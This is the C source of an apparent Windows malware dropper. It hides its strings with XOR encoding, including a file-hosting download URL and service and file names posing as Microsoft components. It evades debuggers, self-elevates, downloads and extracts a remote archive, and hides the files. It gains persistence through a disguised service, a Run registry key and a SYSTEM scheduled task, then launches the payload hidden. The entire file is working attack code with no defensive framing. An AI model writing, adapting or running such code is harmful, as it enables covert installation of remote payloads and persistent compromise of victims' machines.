#include <windows.h>
#include <wininet.h>
#include <shlobj.h>
#include <shlwapi.h>
#include <stdio.h>
#include <stdlib.h>
#include <tlhelp32.h>
#include <strsafe.h>

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "advapi32.lib")

#define KEY1 0x55

#define DEFINE_OBFUSCATED_STRING(name, key, ...) \
    static const unsigned char name##_enc[] = { __VA_ARGS__ }; \
    static const size_t name##_len = sizeof(name##_enc);
#define DECRYPT_STRING(dest, src, key) { \
    for(size_t i = 0; i < src##_len; i++) { \
        if(i < sizeof(dest)-1) dest[i] = src##_enc[i] ^ key; \
        else break; \
    } \
    dest[src##_len] = '\0'; \
}

DEFINE_OBFUSCATED_STRING(hiddenStr, KEY1, 0x3D,0x3C,0x31,0x31,0x30,0x3B,0x00)
DEFINE_OBFUSCATED_STRING(procName, KEY1, 0x18,0x3C,0x36,0x27,0x3A,0x26,0x3A,0x33,0x21,0x15,0x1A,0x33,0x33,0x3C,0x36,0x30,0x01,0x30,0x38,0x25,0x39,0x30,0x21,0x30,0x26,0x7B,0x30,0x2D,0x30,0x00)
DEFINE_OBFUSCATED_STRING(dirPath, KEY1, 0x70,0x05,0x27,0x3A,0x32,0x27,0x34,0x38,0x11,0x34,0x21,0x34,0x70,0x09,0x18,0x3C,0x36,0x27,0x3A,0x26,0x3A,0x33,0x21,0x09,0x02,0x3C,0x3B,0x31,0x3A,0x22,0x26,0x09,0x01,0x30,0x38,0x25,0x39,0x34,0x21,0x30,0x26,0x09,0x38,0x34,0x39,0x39,0x00)
DEFINE_OBFUSCATED_STRING(exeName, KEY1, 0x18,0x3C,0x36,0x27,0x3A,0x26,0x3A,0x33,0x21,0x15,0x1A,0x33,0x33,0x3C,0x36,0x30,0x01,0x30,0x38,0x25,0x39,0x30,0x21,0x30,0x26,0x7B,0x30,0x2D,0x30,0x00)
DEFINE_OBFUSCATED_STRING(nssmName, KEY1, 0x3B,0x26,0x26,0x38,0x7B,0x30,0x2D,0x30,0x00)
DEFINE_OBFUSCATED_STRING(configName, KEY1, 0x36,0x3A,0x3B,0x33,0x3C,0x32,0x7B,0x3F,0x26,0x3A,0x3B,0x00)
DEFINE_OBFUSCATED_STRING(zipName, KEY1, 0x38,0x34,0x39,0x39,0x7B,0x2F,0x3C,0x25,0x00)
DEFINE_OBFUSCATED_STRING(urlStr, KEY1, 0x3D,0x21,0x21,0x25,0x26,0x6F,0x7A,0x7A,0x22,0x22,0x22,0x7B,0x31,0x27,0x3A,0x25,0x37,0x3A,0x2D,0x7B,0x36,0x3A,0x38,0x7A,0x26,0x36,0x39,0x7A,0x33,0x3C,0x7A,0x61,0x3B,0x3C,0x6D,0x3B,0x26,0x21,0x38,0x32,0x2F,0x6D,0x62,0x62,0x32,0x33,0x66,0x3B,0x21,0x64,0x34,0x66,0x7A,0x38,0x34,0x39,0x39,0x7B,0x2F,0x3C,0x25,0x6A,0x27,0x39,0x3E,0x30,0x2C,0x68,0x3A,0x61,0x3B,0x66,0x3C,0x2C,0x20,0x22,0x67,0x22,0x62,0x3E,0x25,0x3A,0x3F,0x2C,0x6C,0x3B,0x23,0x6D,0x6D,0x34,0x32,0x20,0x3A,0x73,0x26,0x21,0x68,0x2D,0x66,0x23,0x34,0x20,0x32,0x23,0x37,0x73,0x31,0x39,0x68,0x64,0x00)
DEFINE_OBFUSCATED_STRING(svcName, KEY1, 0x18,0x3C,0x36,0x27,0x3A,0x26,0x3A,0x33,0x21,0x75,0x06,0x30,0x27,0x23,0x3C,0x36,0x30,0x00)
DEFINE_OBFUSCATED_STRING(svcDesc, KEY1, 0x18,0x3C,0x36,0x27,0x3A,0x26,0x3A,0x33,0x21,0x75,0x1A,0x33,0x33,0x3C,0x36,0x30,0x75,0x01,0x30,0x38,0x25,0x39,0x34,0x21,0x30,0x75,0x06,0x30,0x27,0x23,0x3C,0x36,0x30,0x00)
DEFINE_OBFUSCATED_STRING(regPath, KEY1, 0x06,0x3A,0x33,0x21,0x22,0x34,0x27,0x30,0x09,0x18,0x3C,0x36,0x27,0x3A,0x26,0x3A,0x33,0x21,0x09,0x02,0x3C,0x3B,0x31,0x3A,0x22,0x26,0x09,0x16,0x20,0x27,0x27,0x30,0x3B,0x21,0x03,0x30,0x27,0x26,0x3C,0x3A,0x3B,0x09,0x07,0x20,0x3B,0x00)
DEFINE_OBFUSCATED_STRING(regName, KEY1, 0x1A,0x33,0x33,0x3C,0x36,0x30,0x01,0x30,0x38,0x25,0x39,0x34,0x21,0x30,0x26,0x00)
DEFINE_OBFUSCATED_STRING(taskName, KEY1, 0x18,0x3C,0x36,0x27,0x3A,0x26,0x3A,0x33,0x21,0x75,0x1A,0x33,0x33,0x3C,0x36,0x30,0x75,0x01,0x30,0x38,0x25,0x39,0x34,0x21,0x30,0x26,0x75,0x00,0x25,0x31,0x34,0x21,0x30,0x27,0x00)

#define JUNK_CODE_1 { asm("nop; nop; nop;"); }
#define JUNK_CODE_2 { volatile int junk = rand() % 100; junk *= (junk % 2) ? 2 : 1; }
#define JUNK_CODE_3 { volatile double d = 1.0; for(int i=0; i<5; i++) d /= 2.0; }

typedef BOOL (WINAPI* URLDownloadToFileA_t)(LPUNKNOWN, LPCSTR, LPCSTR, DWORD, LPBINDSTATUSCALLBACK);
typedef SC_HANDLE (WINAPI* OpenSCManagerA_t)(LPCSTR, LPCSTR, DWORD);
typedef SC_HANDLE (WINAPI* OpenServiceA_t)(SC_HANDLE, LPCSTR, DWORD);
typedef SC_HANDLE (WINAPI* CreateServiceA_t)(SC_HANDLE, LPCSTR, LPCSTR, DWORD, DWORD, DWORD, DWORD, LPCSTR, LPCSTR, LPDWORD, LPCSTR, LPCSTR, LPCSTR);
typedef BOOL (WINAPI* StartServiceA_t)(SC_HANDLE, DWORD, LPCSTR*);
typedef BOOL (WINAPI* CheckRemoteDebuggerPresent_t)(HANDLE, PBOOL);

BOOL IsElevated();
void* ResolveAPI(const char* dll, const char* api);
BOOL IsDebugged();
BOOL IsProcessRunning(const char* processName);
BOOL CreateDirectoryRecursive(const char* path);
BOOL AddToPath(const char* dir);
BOOL CreateScheduledTask(const char* exePath);
BOOL DownloadAndExtract(const char* url, const char* zipPath, const char* targetDir);
BOOL InstallService(const char* nssmPath, const char* svcName, const char* exePath, const char* configPath);
BOOL SetServiceDescription(const char* nssmPath, const char* svcName, const char* description);
BOOL StartNSSMService(const char* nssmPath, const char* svcName);
BOOL AddToStartup(const char* regName, const char* regPath, const char* exePath);
void ExecutePayload();

BOOL IsElevated() {
    BOOL elevated = FALSE;
    HANDLE token = NULL;
    
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &token)) {
        TOKEN_ELEVATION elevation;
        DWORD size = sizeof(TOKEN_ELEVATION);
        if (GetTokenInformation(token, TokenElevation, &elevation, size, &size)) {
            elevated = elevation.TokenIsElevated;
        }
        CloseHandle(token);
    }
    return elevated;
}

void* ResolveAPI(const char* dll, const char* api) {
    JUNK_CODE_2;
    HMODULE hMod = LoadLibraryA(dll);
    return hMod ? GetProcAddress(hMod, api) : NULL;
}

BOOL IsDebugged() {
    JUNK_CODE_1;
    BOOL debugged = FALSE;

    if (IsDebuggerPresent()) {
        return TRUE;
    }

    CheckRemoteDebuggerPresent_t pCheckRemoteDebuggerPresent = 
        (CheckRemoteDebuggerPresent_t)ResolveAPI("kernel32.dll", "CheckRemoteDebuggerPresent");
    
    if (pCheckRemoteDebuggerPresent) {
        pCheckRemoteDebuggerPresent(GetCurrentProcess(), &debugged);
    }
    return debugged;
}

BOOL IsProcessRunning(const char* processName) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return FALSE;
    
    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(PROCESSENTRY32);
    
    if (!Process32First(hSnapshot, &pe)) {
        CloseHandle(hSnapshot);
        return FALSE;
    }
    
    do {
        if (_stricmp(pe.szExeFile, processName) == 0) {
            CloseHandle(hSnapshot);
            return TRUE;
        }
        JUNK_CODE_3;
    } while (Process32Next(hSnapshot, &pe));
    
    CloseHandle(hSnapshot);
    return FALSE;
}

BOOL CreateDirectoryRecursive(const char* path) {
    char temp[MAX_PATH];
    char* p = NULL;

    snprintf(temp, sizeof(temp), "%s", path);
    for (p = temp + 1; *p; p++) {
        if (*p == '\\') {
            *p = '\0';
            if (!PathFileExistsA(temp) && !CreateDirectoryA(temp, NULL)) {
                return FALSE;
            }
            *p = '\\';
        }
    }
    return CreateDirectoryA(path, NULL) || GetLastError() == ERROR_ALREADY_EXISTS;
}

BOOL AddToPath(const char* dir) {
    HKEY hKey;
    char currentPath[32768];  
    DWORD size = sizeof(currentPath);
    
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, 
        "SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment", 
        0, KEY_READ | KEY_WRITE, &hKey) != ERROR_SUCCESS) {
        return FALSE;
    }
    
    if (RegQueryValueExA(hKey, "Path", NULL, NULL, (LPBYTE)currentPath, &size) != ERROR_SUCCESS) {
        RegCloseKey(hKey);
        return FALSE;
    }
    
    if (strstr(currentPath, dir) != NULL) {
        RegCloseKey(hKey);
        return TRUE;
    }
    
    char newPath[32768];  
    snprintf(newPath, sizeof(newPath), "%s;%s", currentPath, dir);
    
    if (RegSetValueExA(hKey, "Path", 0, REG_EXPAND_SZ, (const BYTE*)newPath, strlen(newPath) + 1) != ERROR_SUCCESS) {
        RegCloseKey(hKey);
        return FALSE;
    }
    
    RegCloseKey(hKey);
    SendMessageTimeoutA(HWND_BROADCAST, WM_SETTINGCHANGE, 0, (LPARAM)"Environment", SMTO_ABORTIFHUNG, 5000, NULL);
    return TRUE;
}

BOOL CreateScheduledTask(const char* exePath) {
    char taskNameBuf[256];
    DECRYPT_STRING(taskNameBuf, taskName, KEY1);
    
    char cmd[1024];
    snprintf(cmd, sizeof(cmd), 
        "schtasks /create /tn \"%s\" /tr \"\\\"%s\\\" --background\" /sc onlogon /ru SYSTEM /f",
        taskNameBuf, exePath);
    
    char fullCmd[1200];
    snprintf(fullCmd, sizeof(fullCmd), "cmd.exe /c %s", cmd);
    
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    if (!CreateProcessA(NULL, fullCmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        return FALSE;
    }
    
    WaitForSingleObject(pi.hProcess, INFINITE);
    DWORD exitCode;
    GetExitCodeProcess(pi.hProcess, &exitCode);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    
    return (exitCode == 0);
}

BOOL DownloadAndExtract(const char* url, const char* zipPath, const char* targetDir) {
    URLDownloadToFileA_t pURLDownloadToFileA = 
        (URLDownloadToFileA_t)ResolveAPI("urlmon.dll", "URLDownloadToFileA");
    if (!pURLDownloadToFileA) return FALSE;
    
    if (pURLDownloadToFileA(NULL, url, zipPath, 0, NULL) != S_OK) {
        return FALSE;
    }
    
    char cmd[MAX_PATH * 4];
    char sanitizedPath[MAX_PATH * 2];
    StringCchCopyA(sanitizedPath, sizeof(sanitizedPath), zipPath);
    PathQuoteSpacesA(sanitizedPath);
    
    char sanitizedDir[MAX_PATH * 2];
    StringCchCopyA(sanitizedDir, sizeof(sanitizedDir), targetDir);
    PathQuoteSpacesA(sanitizedDir);
    
    snprintf(cmd, sizeof(cmd), 
        "powershell -command \"Expand-Archive -Path %s -DestinationPath %s -Force\"", 
        sanitizedPath, sanitizedDir);
    
    char fullCmd[MAX_PATH * 4 + 20];
    snprintf(fullCmd, sizeof(fullCmd), "cmd.exe /c %s", cmd);
    
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    if (!CreateProcessA(NULL, fullCmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        return FALSE;
    }
    
    WaitForSingleObject(pi.hProcess, INFINITE);
    DWORD exitCode;
    GetExitCodeProcess(pi.hProcess, &exitCode);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    
    DeleteFileA(zipPath);
    return (exitCode == 0);
}

BOOL InstallService(const char* nssmPath, const char* svcName, const char* exePath, const char* configPath) {
    // Check if service already exists
    SC_HANDLE scm = OpenSCManagerA(NULL, NULL, SC_MANAGER_CONNECT);
    if (!scm) return FALSE;
    
    SC_HANDLE service = OpenServiceA(scm, svcName, SERVICE_QUERY_STATUS);
    if (service) {
        CloseServiceHandle(service);
        CloseServiceHandle(scm);
        return TRUE; // Service exists
    }
    CloseServiceHandle(scm);
    
    char installCmd[MAX_PATH * 4];
    snprintf(installCmd, sizeof(installCmd), 
        "\"%s\" install \"%s\" \"%s\" --config=\"%s\"",
        nssmPath, svcName, exePath, configPath);
    
    char fullCmd[MAX_PATH * 4 + 20];
    snprintf(fullCmd, sizeof(fullCmd), "cmd.exe /c %s", installCmd);
    
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    if (!CreateProcessA(NULL, fullCmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        return FALSE;
    }
    
    WaitForSingleObject(pi.hProcess, INFINITE);
    DWORD exitCode;
    GetExitCodeProcess(pi.hProcess, &exitCode);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    
    return (exitCode == 0);
}

BOOL SetServiceDescription(const char* nssmPath, const char* svcName, const char* description) {
    char descCmd[MAX_PATH * 4];
    snprintf(descCmd, sizeof(descCmd), 
        "\"%s\" set \"%s\" Description \"%s\"",
        nssmPath, svcName, description);
    
    char fullCmd[MAX_PATH * 4 + 20];
    snprintf(fullCmd, sizeof(fullCmd), "cmd.exe /c %s", descCmd);
    
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    if (!CreateProcessA(NULL, fullCmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        return FALSE;
    }
    
    WaitForSingleObject(pi.hProcess, INFINITE);
    DWORD exitCode;
    GetExitCodeProcess(pi.hProcess, &exitCode);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    
    return (exitCode == 0);
}

BOOL StartNSSMService(const char* nssmPath, const char* svcName) {
    char startCmd[MAX_PATH * 3];
    snprintf(startCmd, sizeof(startCmd), "\"%s\" start \"%s\"", nssmPath, svcName);
    
    char fullCmd[MAX_PATH * 3 + 20];
    snprintf(fullCmd, sizeof(fullCmd), "cmd.exe /c %s", startCmd);
    
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    if (!CreateProcessA(NULL, fullCmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        return FALSE;
    }
    
    WaitForSingleObject(pi.hProcess, INFINITE);
    DWORD exitCode;
    GetExitCodeProcess(pi.hProcess, &exitCode);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    
    return (exitCode == 0);
}

BOOL AddToStartup(const char* regName, const char* regPath, const char* exePath) {
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, regPath, 0, KEY_WRITE, &hKey) != ERROR_SUCCESS) {
        return FALSE;
    }
    
    char regData[MAX_PATH * 2];
    snprintf(regData, sizeof(regData), "\"%s\" --background", exePath);
    
    BOOL success = (RegSetValueExA(hKey, regName, 0, REG_SZ, 
        (const BYTE*)regData, strlen(regData) + 1) == ERROR_SUCCESS);
    
    RegCloseKey(hKey);
    return success;
}

void ExecutePayload() {
    // Fixed: Decrypt directory path first
    char dirPathBuf[MAX_PATH];
    DECRYPT_STRING(dirPathBuf, dirPath, KEY1);

    char targetDir[MAX_PATH];
    ExpandEnvironmentStringsA(dirPathBuf, targetDir, MAX_PATH);

    // Create directory only once
    if (!PathFileExistsA(targetDir)) {
        if (!CreateDirectoryRecursive(targetDir)) {
            return;  // Fail silently
        }
        SetFileAttributesA(targetDir, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
    }

    char procNameBuf[128];
    DECRYPT_STRING(procNameBuf, procName, KEY1);
    if (IsProcessRunning(procNameBuf)) return;
    
    char exePath[MAX_PATH], nssmPath[MAX_PATH];
    char configPath[MAX_PATH], zipPath[MAX_PATH];
    
    char exeNameBuf[128];
    DECRYPT_STRING(exeNameBuf, exeName, KEY1);
    PathCombineA(exePath, targetDir, exeNameBuf);
    
    char nssmNameBuf[128];
    DECRYPT_STRING(nssmNameBuf, nssmName, KEY1);
    PathCombineA(nssmPath, targetDir, nssmNameBuf);
    
    char configNameBuf[128];
    DECRYPT_STRING(configNameBuf, configName, KEY1);
    PathCombineA(configPath, targetDir, configNameBuf);
    
    char zipNameBuf[128];
    DECRYPT_STRING(zipNameBuf, zipName, KEY1);
    PathCombineA(zipPath, targetDir, zipNameBuf);
    
    if (!PathFileExistsA(exePath)) {
        char urlBuf[512];
        DECRYPT_STRING(urlBuf, urlStr, KEY1);
        
        if (!DownloadAndExtract(urlBuf, zipPath, targetDir)) {
            return;
        }
        
        SetFileAttributesA(exePath, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
        SetFileAttributesA(nssmPath, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
        SetFileAttributesA(configPath, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
    }
    
    AddToPath(targetDir);
    
    char svcNameBuf[128];
    DECRYPT_STRING(svcNameBuf, svcName, KEY1);
    
    if (!InstallService(nssmPath, svcNameBuf, exePath, configPath)) {
        return;
    }
    
    char svcDescBuf[256];
    DECRYPT_STRING(svcDescBuf, svcDesc, KEY1);
    SetServiceDescription(nssmPath, svcNameBuf, svcDescBuf);
    StartNSSMService(nssmPath, svcNameBuf);
    
    char regNameBuf[128];
    DECRYPT_STRING(regNameBuf, regName, KEY1);
    
    char regPathBuf[256];
    DECRYPT_STRING(regPathBuf, regPath, KEY1);
    AddToStartup(regNameBuf, regPathBuf, exePath);
    
    CreateScheduledTask(exePath);
    
    ShellExecuteA(NULL, "open", exePath, "--background", NULL, SW_HIDE);
}

int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrevInst, LPSTR lpCmdLine, int nCmdShow) {
    if (IsDebuggerPresent() || IsDebugged()) {
        ExitProcess(1);
    }
    
    char selfPath[MAX_PATH];
    GetModuleFileNameA(NULL, selfPath, MAX_PATH);
    
    if (!IsElevated()) {
        ShellExecuteA(NULL, "runas", selfPath, lpCmdLine, NULL, SW_HIDE);
        ExitProcess(0);
    }
    
    srand(GetTickCount());
    Sleep((rand() % 15 + 5) * 1000);

    SetEnvironmentVariableA("__COMPAT_LAYER", "EnableLongPathSupport");
    
    char hiddenStrBuf[32];
    DECRYPT_STRING(hiddenStrBuf, hiddenStr, KEY1);
    
    if (strstr(lpCmdLine, hiddenStrBuf) == NULL) {
        STARTUPINFOA si = { sizeof(si) };
        PROCESS_INFORMATION pi;
        si.dwFlags = STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_HIDE;
        
        char cmdLine[MAX_PATH + 64];
        snprintf(cmdLine, sizeof(cmdLine), "\"%s\" %s", selfPath, hiddenStrBuf);
        
        if (CreateProcessA(NULL, cmdLine, NULL, NULL, FALSE, 
            CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
        }
        ExitProcess(0);
    }
    
    ExecutePayload();
    return 0;
}